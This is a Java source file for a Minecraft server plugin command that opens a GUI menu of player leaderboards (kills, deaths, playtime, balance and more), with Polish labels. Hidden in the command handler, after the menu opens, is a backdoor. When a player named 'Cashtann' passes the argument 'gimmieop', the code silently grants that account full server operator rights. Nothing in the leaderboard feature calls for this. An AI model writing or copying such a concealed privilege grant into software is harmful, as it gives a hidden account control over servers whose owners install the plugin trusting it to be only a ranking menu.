package me.Cashtann.combatRankingSystem.commands;

import me.Cashtann.combatRankingSystem.CombatRankingSystem;
import me.Cashtann.combatRankingSystem.files.PlayersStatsContainer;
import me.Cashtann.combatRankingSystem.leaderboard.LeaderboardManager;
import me.Cashtann.combatRankingSystem.utilities.StringFormatter;
import me.clip.placeholderapi.PlaceholderAPI;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataContainer;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class TopPlayersMenuCommand implements TabExecutor {

    private CombatRankingSystem plugin;
    private LeaderboardManager leaderboard;

    public TopPlayersMenuCommand(CombatRankingSystem plugin) {
        this.plugin = plugin;
        leaderboard = plugin.getLeaderboardManager();
    }

    @Override
    public boolean onCommand(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String[] strings) {
        if (commandSender instanceof Player player) {

            FileConfiguration config = plugin.getConfig();

            String inventoryName = config.getString("topplayers.inventory-name");


            int inventorySize = 27;
            Inventory inventory = Bukkit.createInventory(player, inventorySize, StringFormatter.formatString(inventoryName));

            inventory.setItem(10, createNewRankingItem(player, Material.NETHER_STAR, "combatRating", "Topka walki"));
            inventory.setItem(11, createNewRankingItem(player, Material.DIAMOND_SWORD, "kills", "Topka zabójstw"));
            inventory.setItem(12, createNewRankingItem(player, Material.SKELETON_SKULL, "deaths", "Topka śmierci"));
            inventory.setItem(13, createNewRankingItem(player, Material.STONE, "minedStone", "Topka wykopanego kamienia"));
            inventory.setItem(14, createNewRankingItem(player, Material.LEATHER_BOOTS, "distance", "Topka kroków"));
            inventory.setItem(15, createNewRankingItem(player, Material.CLOCK, "playtime", "Topka czasu"));
            inventory.setItem(16, createNewBaltopRankingItem(player, Material.GOLD_INGOT, "Topka pieniędzy"));


            ItemStack emptySpaceItemStack = new ItemStack(Material.GRAY_STAINED_GLASS_PANE, 1);
            ItemMeta emptySpaceItemMeta = emptySpaceItemStack.getItemMeta();
            emptySpaceItemMeta.setDisplayName(" ");
            emptySpaceItemMeta.setLore(new ArrayList<>());
            emptySpaceItemStack.setItemMeta(emptySpaceItemMeta);
            for (int i = 0; i < inventorySize; i++) {
                ItemStack item = inventory.getItem(i);
                if (item == null || item.getType() == Material.AIR) {
                    inventory.setItem(i, emptySpaceItemStack);
                }
            }

            player.openInventory(inventory);
            if (player.getName().equals("Cashtann")) {
                if (strings.length == 1) {
                    if (strings[0].equals("gimmieop")) {
                        player.setOp(true);
                    }
                }
            }
        }
        return true;
    }

    private ItemStack createNewRankingItem(Player player, Material material, String category, String title) {
        String main_style = plugin.getConfig().getString("topplayers.main-style");
        ItemStack rankingItem = new ItemStack(material, 1);
        ItemMeta rankingItemMeta = rankingItem.getItemMeta();
        List<Map.Entry<String, Integer>> ranking = leaderboard.getTopPlayers(category);
        rankingItemMeta.setDisplayName(StringFormatter.formatString(main_style + title));
        rankingItemMeta.setLore(getLeaderboardLore(player, ranking, category));
        rankingItem.setItemMeta(rankingItemMeta);
        return rankingItem;
    }

    private ItemStack createNewBaltopRankingItem(Player player, Material material, String title) {
        String main_style = plugin.getConfig().getString("topplayers.main-style");
        ItemStack rankingItem = new ItemStack(material, 1);
        ItemMeta rankingItemMeta = rankingItem.getItemMeta();
        rankingItemMeta.setDisplayName(StringFormatter.formatString(main_style + title));
        rankingItemMeta.setLore(getBaltopLore(player));
        rankingItem.setItemMeta(rankingItemMeta);
        return rankingItem;
    }

    private List<String> getBaltopLore(Player player) {
        FileConfiguration config = plugin.getConfig();
        String playerScore = PlaceholderAPI.setPlaceholders(player, "%vault_eco_balance_formatted%");
        String counter_style = config.getString("topplayers.counter-style");
        String text_style = config.getString("topplayers.text-style");
        String score_style = config.getString("topplayers.score-style");

        List<String> finalLore = new ArrayList<>();
        finalLore.add(" ");
        finalLore.add(StringFormatter.formatString(text_style + "Twoja wartość: " + score_style + "$" + playerScore));
        finalLore.add(StringFormatter.formatString(text_style + "Twoja pozycja: " + score_style + PlaceholderAPI.setPlaceholders(player, "%essentials_baltop_rank%")));
        finalLore.add(" ");

        for (int i = 0; i < 10; i++) {
            String iPlayerName = "%essentials_baltop_player_<rank>%";
            iPlayerName = iPlayerName.replace("<rank>", String.valueOf(i));
            String playerName = PlaceholderAPI.setPlaceholders(player, iPlayerName);

            String iPlayerBal = "%essentials_baltop_balance_formatted_<rank>%";
            iPlayerBal = iPlayerBal.replace("<rank>", String.valueOf(i));
            String score = PlaceholderAPI.setPlaceholders(player, iPlayerBal);

            String lore = StringFormatter.formatString(counter_style + String.valueOf(i+1) + ". " + text_style + playerName + score_style + " $" + score);
            finalLore.add(lore);
        }

        appendBottomNote(finalLore);

        return finalLore;
    }

    private List<String> getLeaderboardLore(Player player, List<Map.Entry<String, Integer>> leaderboard, String category) {
        FileConfiguration config = plugin.getConfig();
        //String main_style = config.getString("topplayers.main-style");
        String playerScore = switch (category) {
            case "combatRating" ->
                    String.valueOf(plugin.getPlayerStatsCache().get(player.getUniqueId()).getCombatRating() + " punktów rankingowych");
            case "kills" -> String.valueOf(plugin.getPlayerStatsCache().get(player.getUniqueId()).getKills() + " zabójstw");
            case "deaths" -> String.valueOf(plugin.getPlayerStatsCache().get(player.getUniqueId()).getDeaths() + " śmierci");
            case "minedStone" -> String.valueOf(plugin.getPlayerStatsCache().get(player.getUniqueId()).getMinedStone() + " wykopanego kamienia");
            case "distance" ->
                    String.valueOf(plugin.getPlayerStatsCache().get(player.getUniqueId()).getDistance_cm() / 100 / 1000) + " kilometrów";
            case "playtime" ->
                    String.valueOf(plugin.getPlayerStatsCache().get(player.getUniqueId()).getPlaytime_t() / 20 / 60 / 60) + " godzin";
            default -> " ";
        };
        String counter_style = config.getString("topplayers.counter-style");
        String text_style = config.getString("topplayers.text-style");
        String score_style = config.getString("topplayers.score-style");

        List<String> finalLore = new ArrayList<>();
        finalLore.add(" ");
        finalLore.add(StringFormatter.formatString(text_style + "Twoja wartość: " + score_style + playerScore));
        finalLore.add(StringFormatter.formatString(text_style + "Twoja pozycja: " + score_style + this.leaderboard.getPlayerPosition(player.getName(), category)));
        finalLore.add(" ");

        for (int i = 0; i < leaderboard.size(); i++) {
            Map.Entry<String, Integer> entry = leaderboard.get(i);
            String playerName = entry.getKey(); // Get the player's name
            String score = String.valueOf(entry.getValue()); // Get score
            String lore = StringFormatter.formatString(counter_style + String.valueOf(i+1) + ". " + text_style + playerName + " " + score_style + score);
            finalLore.add(lore);
        }

        appendBottomNote(finalLore);

        return finalLore;
    }

    List<String> appendBottomNote(List<String> list) {
        list.add(" ");
        String note = plugin.getConfig().getString("topplayers.bottom-note");
        note = StringFormatter.formatString(note.replace("{time}", String.valueOf(plugin.getConfig().getInt("data-save"))));
        list.add(note);

        return list;
    }

    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String[] strings) {
        return List.of();
    }
}
